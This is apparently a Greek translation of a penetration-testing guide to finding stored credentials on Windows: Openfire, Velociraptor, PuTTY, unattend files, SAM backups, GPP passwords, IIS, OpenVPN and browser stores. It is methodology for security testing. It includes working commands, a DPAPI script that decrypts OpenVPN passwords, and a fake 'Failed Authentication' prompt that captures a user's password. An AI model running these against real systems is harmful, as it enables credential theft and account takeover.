Μια εγκατάσταση Openfire που χρησιμοποιεί την ενσωματωμένη βάση δεδομένων μπορεί να διατηρεί το `openfire.script` κάτω από το `Openfire\embedded-db`. Αν ο τρέχων λογαριασμός μπορεί να το διαβάσει, εξετάστε μαζί τις εγγραφές `OFUSER` και την ιδιότητα `passwordKey`. Η [τεκμηρίωση παρόχου χρηστών](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) του Openfire αναφέρει ότι οι κωδικοί πρόσβασης μπορούν να αποθηκεύονται ως απλό κείμενο ή κρυπτογραφημένοι με κλειδί που βρίσκεται σε αυτή την ιδιότητα. Ένας ανακτημένος κωδικός πρόσβασης έχει σημασία για την κλιμάκωση προνομίων μόνο αν εξακολουθεί να ισχύει για ταυτότητα με περισσότερα προνόμια· το όνομα αρχείου από μόνο του δεν αποδεικνύει ούτε δικαίωμα ανάγνωσης ούτε επαναχρησιμοποίηση διαπιστευτηρίων. Η διαδρομή αποτελεί ένδειξη για απογραφή, γι' αυτό μην εμφανίζετε περιεχόμενο βάσης δεδομένων και διαπιστευτήρια στα συνήθη αποτελέσματα απαρίθμησης.

Το ξεχωριστό αρχείο `Openfire\conf\openfire.xml` μπορεί να αποκαλύψει τις ρυθμισμένες θύρες και τη διεπαφή bind της κονσόλας διαχείρισης, ακόμη και όταν χρησιμοποιείται εξωτερική βάση δεδομένων. Το Openfire συνήθως κάνει bind την κονσόλα διαχείρισης στο loopback· αυτό εξακολουθεί να επιτρέπει σε έναν τοπικό λογαριασμό να έχει πρόσβαση στη διεύθυνση, αν ο listener εκτελείται. Ελέγξτε από κοινού τον πραγματικό listener, τον εξουσιοδοτημένο ρόλο διαχειριστή, την πολιτική μεταφόρτωσης plugin και την ταυτότητα υπηρεσίας Openfire. Ένας διαχειριστής που μπορεί να εγκαταστήσει plugin ενδέχεται να προκαλέσει την εκτέλεση κώδικα του plugin στο πλαίσιο της υπηρεσίας, η οποία μπορεί να έχει υψηλά προνόμια όταν η υπηρεσία εκτελείται ως LocalSystem. Ένας κωδικός πρόσβασης που ταιριάζει ή μια αναγνώσιμη διαδρομή ρυθμίσεων από μόνα τους δεν αποδεικνύουν πρόσβαση στην κονσόλα διαχείρισης ή εκτέλεση κώδικα. Δείτε τον [οδηγό εγκατάστασης και διαχείρισης plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) του προμηθευτή και την [ιδιότητα API μεταφόρτωσης plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Διαμόρφωση forensic server διαχείρισης

Οι διαμορφώσεις server του Velociraptor, που συνήθως ονομάζονται `server.config.yaml`, μπορεί να περιέχουν το `CA.private_key` της εσωτερικής CA. Αν ένας χρήστης με λιγότερα προνόμια μπορεί να διαβάσει αυτό το κλειδί, ενδέχεται να μπορεί να δημιουργήσει πιστοποιητικό API client. Το αν αυτό οδηγεί σε περισσότερα προνόμια εξαρτάται από τους ρόλους χρηστών του server, την προσβασιμότητα του API και την ταυτότητα με την οποία εκτελείται ο server ή ο agent-στόχος. Μια διαμόρφωση client περιέχει διαφορετικό υλικό· η εύρεσή της δεν αποδεικνύει πρόσβαση στην CA του server. Ορισμένες εγκαταστάσεις διατηρούν το ιδιωτικό κλειδί CA εκτός σύνδεσης, οπότε μια αναγνώσιμη διαμόρφωση server μπορεί επίσης να μην περιλαμβάνει το κλειδί υπογραφής.

Σε Windows server, επιθεωρήστε τα ACL της διαμόρφωσης **server** στον κατάλογο εγκατάστασής του και τυχόν προστατευμένα αντίγραφα ασφαλείας. Μια πιθανή θέση είναι `%ProgramFiles%\VelociraptorServer\server.config.yaml`· αν διαφέρει, χρησιμοποιήστε τη διαδρομή που έχει ρυθμιστεί για την υπηρεσία. Επιβεβαιώστε ότι η τρέχουσα ταυτότητα μπορεί να διαβάσει το αρχείο και ότι υπάρχει πράγματι το `CA.private_key`. Αποφύγετε την εμφάνιση του ιδιωτικού κλειδιού σε logs ή αποτελέσματα απαρίθμησης. Η ροή εργασιών `config api_client` του προμηθευτή χρησιμοποιεί το κλειδί CA για την έκδοση πιστοποιητικού client, αλλά απαιτείται επίσης κατάλληλος ρόλος στην πλευρά του server· η δημιουργία ή η αλλαγή του μπορεί να απαιτεί δικαίωμα εγγραφής στο datastore ή επανεκκίνηση. Μια υπάρχουσα ταυτότητα server με περισσότερα προνόμια μπορεί να προσφέρει διαδρομή ακόμη και όταν αυτές οι εγγραφές δεν είναι διαθέσιμες. Τα API queries με δικαιώματα εκτέλεσης εκτελούνται στο σχετικό πλαίσιο server ή agent, το οποίο μπορεί να έχει υψηλά προνόμια.

Προστατέψτε τη διαμόρφωση server και τα αντίγραφα ασφαλείας με περιοριστικά ACL, διατηρήστε το κλειδί υπογραφής CA εκτός σύνδεσης όπου είναι δυνατό και περιορίστε τους ρόλους API και την πρόσβαση στους listeners. Δείτε την [τεκμηρίωση API του Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) και τις [οδηγίες διαμόρφωσης ασφαλείας](https://docs.velociraptor.app/docs/deployment/security/).

### Διαπιστευτήρια PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Το Solar-PuTTY είναι ξεχωριστός διαχειριστής συνεδριών. Το εγγενές κρυπτογραφημένο αποθετήριό του μπορεί να βρίσκεται στο `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, ενώ ένα εξαγόμενο αντίγραφο ασφαλείας συνεδριών μπορεί να ονομάζεται `sessions-backup.dat` και να αποθηκεύεται αλλού. Ο [οδηγός εξαγωγής της SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) αναφέρει ότι οι εξαγωγές είναι κρυπτογραφημένες με κωδικό πρόσβασης και μπορεί να περιέχουν συνεδρίες, κλειδιά, scripts, ετικέτες και συσχετίσεις. Το [φόρουμ υποστήριξης](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) προσδιορίζει το εγγενές αποθετήριο. Ελέγξτε πρώτα τα δικαιώματα και τις διαδρομές των αρχείων. Η εύρεση οποιουδήποτε από τα δύο αρχεία δεν αποκαλύπτει τον κωδικό πρόσβασής του ούτε αποδεικνύει ότι τυχόν αποθηκευμένα διαπιστευτήρια εξακολουθούν να είναι έγκυρα ή διαθέτουν αυξημένα προνόμια.

### Putty Κλειδιά κεντρικών υπολογιστών SSH

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Κλειδιά SSH στο μητρώο

Τα ιδιωτικά κλειδιά SSH μπορούν να αποθηκεύονται στο κλειδί μητρώου `HKCU\Software\OpenSSH\Agent\Keys`, επομένως θα πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Αν βρείτε κάποια καταχώριση μέσα σε αυτήν τη διαδρομή, πιθανότατα πρόκειται για αποθηκευμένο SSH key. Είναι αποθηκευμένο κρυπτογραφημένο, αλλά μπορεί εύκολα να αποκρυπτογραφηθεί με το [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες για αυτήν την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Αν η υπηρεσία `ssh-agent` δεν εκτελείται και θέλετε να ξεκινά αυτόματα κατά την εκκίνηση, εκτελέστε:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Φαίνεται ότι αυτή η τεχνική δεν είναι πλέον έγκυρη. Προσπάθησα να δημιουργήσω ορισμένα ssh keys, να τα προσθέσω με το `ssh-add` και να συνδεθώ μέσω ssh σε ένα μηχάνημα. Το registry HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε χρήση του `dpapi.dll` κατά τον έλεγχο ταυτότητας με ασύμμετρο κλειδί.

### Αρχεία unattended

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας το **metasploit**: _post/windows/gather/enum_unattend_

Παράδειγμα περιεχομένου:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Αντίγραφα ασφαλείας SAM & SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Αναγνώσιμα αρχεία αντιγράφων ασφαλείας Windows Imaging (`.wim`) μπορεί επίσης να περιέχουν offline hives `SAM`, `SECURITY` και `SYSTEM`. Δώστε προτεραιότητα σε τοπικά προσβάσιμους καταλόγους αντιγράφων ασφαλείας ή image και ελέγξτε τα **ονόματα των μελών** ενός image πριν εξαγάγετε οτιδήποτε· μόνο το όνομα αρχείου `.wim` δεν αποδεικνύει ότι εκτίθενται hives, ενώ τα συνηθισμένα `install.wim`, `boot.wim` και τα images αποκατάστασης συχνά αποτελούν λανθασμένες ενδείξεις. Ένα SMB share είναι ξεχωριστή διαδρομή πρόσβασης και πρέπει να ελέγχεται μόνο όταν εμπίπτει στο πεδίο εφαρμογής. Δείτε τις [οδηγίες της Microsoft για τα Windows images](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) και την [αναφορά αρχείων registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Διαπιστευτήρια Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Αναζητήστε ένα αρχείο με όνομα **SiteList.xml**

### Κωδικός πρόσβασης GPP στην cache

Υπήρχε παλαιότερα μια δυνατότητα που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών λογαριασμών διαχειριστή σε μια ομάδα μηχανημάτων μέσω των Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά κενά ασφαλείας. Πρώτον, τα Group Policy Objects (GPOs), αποθηκευμένα ως αρχεία XML στο SYSVOL, ήταν προσβάσιμα σε οποιονδήποτε χρήστη του domain. Δεύτερον, οι κωδικοί πρόσβασης σε αυτά τα GPP, κρυπτογραφημένοι με AES256 χρησιμοποιώντας ένα δημόσια τεκμηριωμένο προεπιλεγμένο κλειδί, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε πιστοποιημένο χρήστη. Αυτό αποτελούσε σοβαρό κίνδυνο, καθώς μπορούσε να επιτρέψει στους χρήστες να αποκτήσουν αυξημένα προνόμια.

Για να μετριαστεί αυτός ο κίνδυνος, αναπτύχθηκε μια συνάρτηση που αναζητά τοπικά αποθηκευμένα στην cache αρχεία GPP τα οποία περιέχουν πεδίο "cpassword" με μη κενή τιμή. Όταν εντοπίζει ένα τέτοιο αρχείο, η συνάρτηση αποκρυπτογραφεί τον κωδικό πρόσβασης και επιστρέφει ένα προσαρμοσμένο αντικείμενο PowerShell. Αυτό το αντικείμενο περιλαμβάνει λεπτομέρειες σχετικά με το GPP και τη θέση του αρχείου, διευκολύνοντας τον εντοπισμό και την αποκατάσταση αυτής της ευπάθειας ασφαλείας.

Αναζητήστε αυτά τα αρχεία στο `C:\ProgramData\Microsoft\Group Policy\history` ή στο _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (πριν από τα Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Για να αποκρυπτογραφήσετε το cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Χρήση του crackmapexec για την απόκτηση κωδικών πρόσβασης:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Διαμόρφωση Web του IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Παράδειγμα του web.config με διαπιστευτήρια:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Αρχεία αντιγράφων ασφαλείας σε IIS webroot

Ένα παλιό αντίγραφο ασφαλείας ZIP τοποθετημένο απευθείας σε webroot που εξυπηρετείται μέσω HTTP μπορεί να αποκαλύψει παλαιότερα αρχεία ρυθμίσεων και επαναχρησιμοποιήσιμα διαπιστευτήρια. Ελέγξτε τη διαμορφωμένη φυσική διαδρομή του ιστότοπου και αν το αρχείο είναι πράγματι προσβάσιμο μέσω HTTP, προτού θεωρήσετε ότι υπάρχει έκθεση. Η προεπιλεγμένη διαδρομή `C:\inetpub\wwwroot` είναι απλώς μια υποψήφια τοποθεσία. Μια γρήγορη τοπική καταγραφή μπορεί να εμφανίσει ονόματα και μεγέθη χωρίς να ανοίξει τα αρχεία:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Ένα όνομα αρχείου αρχειοθήκης δεν αποδεικνύει ότι περιέχει κάποιο μυστικό ούτε ότι τα διαπιστευτήρια που ανακτήθηκαν παρέχουν αυξημένα προνόμια.

### Διαπιστευτήρια OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Καταγραφές

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Ζητήστε διαπιστευτήρια

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισαγάγει τα διαπιστευτήριά του ή ακόμα και τα διαπιστευτήρια διαφορετικού χρήστη**, αν πιστεύετε ότι μπορεί να τα γνωρίζει (έχετε υπόψη ότι το να ζητήσετε απευθείας από τον πελάτη τα **διαπιστευτήρια** είναι πραγματικά **επικίνδυνο**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Πιθανά ονόματα αρχείων που περιέχουν διαπιστευτήρια**

Γνωστά αρχεία που κάποτε περιείχαν **κωδικούς πρόσβασης** σε **απλό κείμενο** ή **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Οι βάσεις δεδομένων Password Safe v3 χρησιμοποιούν συνήθως την επέκταση `.psafe3`. Αντιμετωπίστε ένα αρχείο με αντίστοιχο όνομα ως πιθανό κρυπτογραφημένο θησαυροφυλάκιο· η παρουσία του δεν αποδεικνύει ότι μπορείτε να το διαβάσετε, να το ξεκλειδώσετε ή να χρησιμοποιήσετε τυχόν αποθηκευμένα διαπιστευτήρια. Κατά τον έλεγχο των θέσεων αποθήκευσης τέτοιων αρχείων, εξετάστε τα προσβάσιμα προφίλ χρηστών και τις ρυθμισμένες ρίζες κοινής χρήσης αρχείων.

Ένα αναγνώσιμο αρχείο KeePass `.kdbx` αποτελεί επίσης μόνο ένδειξη πιθανού κρυπτογραφημένου θησαυροφυλακίου. Για να το ξεκλειδώσετε, χρειάζεστε τον πραγματικό κύριο κωδικό πρόσβασης και τυχόν ρυθμισμένο αρχείο κλειδιού ή παράγοντες λογαριασμού. Αν ένας εξουσιοδοτημένος έλεγχος εντοπίσει σε κάποια εγγραφή ζεύγος hash LM:NT, επαληθεύστε τον αναφερόμενο λογαριασμό και αν το NT hash είναι τρέχον και γίνεται δεκτό από την υπηρεσία NTLM του στόχου, προτού εξετάσετε το ενδεχόμενο [pass-the-hash](../ntlm/README.md#pass-the-hash). Μια εγγραφή στο θησαυροφυλάκιο δεν παρέχει από μόνη της δικαιώματα Administrator ή SYSTEM· πρέπει επίσης να ισχύουν η απομακρυσμένη πρόσβαση στην υπηρεσία, τα δικαιώματα του λογαριασμού και τυχόν ξεχωριστό βήμα εκτέλεσης υπηρεσίας. Η καταγραφή πρέπει να αναφέρει τη διαδρομή του θησαυροφυλακίου και αν είναι αναγνώσιμο, όχι να εμφανίζει τη βάση δεδομένων ή τα αποθηκευμένα διαπιστευτήρια.

Αναζητήστε σε όλα τα προτεινόμενα αρχεία:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Διαπιστευτήρια στον Κάδο Ανακύκλωσης

Ελέγξτε τα προσβάσιμα στοιχεία του Κάδου Ανακύκλωσης για διαγραμμένα αντίγραφα ασφαλείας και αρχεία ρυθμίσεων, καθώς και για αρχεία με ονόματα που αναφέρουν ρητά διαπιστευτήρια. Ένα χρήσιμο αντίγραφο ασφαλείας `.7z`, `.zip` ή `.rar` μπορεί να είναι μηνών και να έχει ένα συνηθισμένο όνομα αρχείου. Τα Windows αποθηκεύουν την αρχική διαδρομή και την ώρα διαγραφής σε μια εγγραφή `$I` και το διαγραμμένο αρχείο ως αντίστοιχη εγγραφή `$R`· εξετάστε τα μεταδεδομένα και βεβαιωθείτε ότι η τρέχουσα ταυτότητα έχει δικαίωμα ανάγνωσης πριν ανοίξετε ένα αρχείο αρχειοθέτησης. Η ορατότητα εξαρτάται από τον τόμο, το SID χρήστη και τα δικαιώματα αρχείου, επομένως μια κενή λίστα δεν αποδεικνύει ότι δεν υπάρχει ανακτήσιμο αντίγραφο ασφαλείας. Αντιμετωπίστε το όνομα ενός αρχείου αρχειοθέτησης ως υποψήφιο για έλεγχο, όχι ως απόδειξη ότι περιέχει έγκυρο μυστικό.

Ένα προσβάσιμο διαγραμμένο `.pfx` μπορεί επίσης να αποτελέσει ένδειξη για **code-signing**. Αν περιέχει προσβάσιμο ιδιωτικό κλειδί, το κλειδί μπορεί να υπογράψει ένα τροποποιημένο script PowerShell· το [PowerShell απαιτεί πιστοποιητικό code-signing με ιδιωτικό κλειδί](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), ενώ οι [κανόνες publisher του AppLocker αξιολογούν την ταυτότητα του υπογράφοντος και το εύρος του κανόνα](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Για εκτέλεση μεταξύ λογαριασμών, η τρέχουσα ταυτότητα πρέπει να μπορεί να τροποποιήσει το συγκεκριμένο script, να ισχύει ένας κανόνας που αποδέχεται την προκύπτουσα υπογραφή για το script και τον λογαριασμό-στόχο, και μια προγραμματισμένη εργασία ή άλλη διεργασία με υψηλότερα δικαιώματα να το εκτελεί πράγματι. Το όνομα ενός αρχείου `.pfx`, το θέμα του πιστοποιητικού ή ένα εγγράψιμο script από μόνο του δεν τεκμηριώνει αυτή την αλυσίδα. Ελέγξτε τα μεταδεδομένα, τις ACL, την πολιτική και την προγραμματισμένη εντολή πριν ανοίξετε υλικό ιδιωτικού κλειδιού ή ενεργοποιήσετε την εργασία.

Ελέγξτε επίσης τις προσβάσιμες βάσεις δεδομένων προφίλ προγραμμάτων ανταλλαγής μηνυμάτων, τις σημειώσεις και τα ληφθέντα αρχεία για ενδείξεις διαπιστευτηρίων. Μια εξαγωγή κλειδιού ανάκτησης BitLocker μπορεί να είναι αποθηκευμένη ως HTML ή TXT, μερικές φορές μέσα σε ένα επώνυμο αντίγραφο ασφαλείας. Τέτοιο υλικό μπορεί να παρέχει πρόσβαση σε ξεχωριστό κρυπτογραφημένο τόμο δεδομένων που περιέχει παλαιότερα αντίγραφα ασφαλείας· εξετάστε τον τόμο και το αρχείο αρχειοθέτησης μόνο εφόσον έχετε εξουσιοδότηση πρόσβασης. Αν ένα αντίγραφο ασφαλείας περιλαμβάνει `NTDS.dit`, η ανάκτηση διαπιστευτηρίων τομέα εκτός σύνδεσης απαιτεί επίσης την αντίστοιχη κυψέλη `SYSTEM`, όπως περιγράφεται στη [ροή εργασίας αντιγράφων ασφαλείας και προνομιούχων ομάδων](../active-directory-methodology/privileged-groups-and-token-privileges.md). Τα ονόματα αρχείων και ένας κλειδωμένος τόμος από μόνα τους δεν αποδεικνύουν ότι υπάρχει λειτουργικό κλειδί ανάκτησης ή αντίγραφο ασφαλείας τομέα.

Για να **ανακτήσετε κωδικούς πρόσβασης** που έχουν αποθηκευτεί από διάφορα προγράμματα, μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Μέσα στο registry

**Άλλα πιθανά κλειδιά registry με διαπιστευτήρια**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Εξαγωγή κλειδιών openssh από το μητρώο.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό προγραμμάτων περιήγησης

Θα πρέπει να αναζητήσετε βάσεις δεδομένων όπου αποθηκεύονται κωδικοί πρόσβασης από **Chrome, Edge ή Firefox**.\
Ελέγξτε επίσης το ιστορικό, τους σελιδοδείκτες και τα αγαπημένα των προγραμμάτων περιήγησης, καθώς ενδέχεται να είναι αποθηκευμένοι εκεί **κωδικοί πρόσβασης**.

Για το συμβατικό προφίλ **Default** του Edge του τρέχοντος χρήστη, το `Login Data` βρίσκεται στο `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, ενώ το `Local State` βρίσκεται στον γονικό κατάλογο `User Data`. [Η Microsoft τεκμηριώνει την προεπιλεγμένη θέση του προφίλ](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)· ένα άλλο προφίλ ή μια πολιτική `UserDataDir` μπορεί να αλλάξει τη θέση του. Η παρουσία αρχείων αποτελεί μόνο ένδειξη για πιθανή αποθήκευση διαπιστευτηρίων: επιβεβαιώστε ότι τα αρχεία είναι αναγνώσιμα, ότι έχετε το πλαίσιο DPAPI του αντίστοιχου χρήστη ή άλλο εξουσιοδοτημένο υλικό κλειδιού και ότι μια αποθηκευμένη σύνδεση ανήκει σε λογαριασμό με περισσότερα προνόμια. Η απαρίθμηση μόνο των διαδρομών δεν απαιτεί άνοιγμα της βάσης δεδομένων ή εμφάνιση αποκρυπτογραφημένων κωδικών πρόσβασης.

Για τον Firefox, [η Mozilla τεκμηριώνει](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) ότι τα `key4.db` και `logins.json` ενός προφίλ είναι τα αντίστοιχα αρχεία κλειδιού και κρυπτογραφημένων συνδέσεων. Η παρουσία τους αποτελεί μόνο ένδειξη: ελέγξτε αν είναι και τα δύο αναγνώσιμα, αν υπάρχουν αποθηκευμένες εγγραφές και αν το Primary Password προστατεύει το κλειδί, πριν καταλήξετε ότι τα διαπιστευτήρια μπορούν να χρησιμοποιηθούν. Αν ένα ανακτημένο διαπιστευτήριο ανήκει σε λογαριασμό τομέα, εξετάστε ξεχωριστά τα ισχύοντα δικαιώματα ελέγχου ομάδων αυτού του λογαριασμού και τα [δικαιώματα ανάγνωσης ή αποκρυπτογράφησης κωδικών LAPS](../active-directory-methodology/laps.md) της ομάδας· τα τεχνουργήματα του προγράμματος περιήγησης από μόνα τους δεν αποδεικνύουν διαδρομή προς δικαιώματα διαχειριστή.

Εργαλεία για εξαγωγή κωδικών πρόσβασης από προγράμματα περιήγησης:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Το **Component Object Model (COM)** είναι μια τεχνολογία ενσωματωμένη στο λειτουργικό σύστημα Windows, η οποία επιτρέπει την **επικοινωνία** μεταξύ στοιχείων λογισμικού γραμμένων σε διαφορετικές γλώσσες. Κάθε στοιχείο COM **ταυτοποιείται μέσω ενός class ID (CLSID)** και εκθέτει λειτουργίες μέσω μίας ή περισσότερων διεπαφών, οι οποίες ταυτοποιούνται μέσω interface IDs (IIDs).

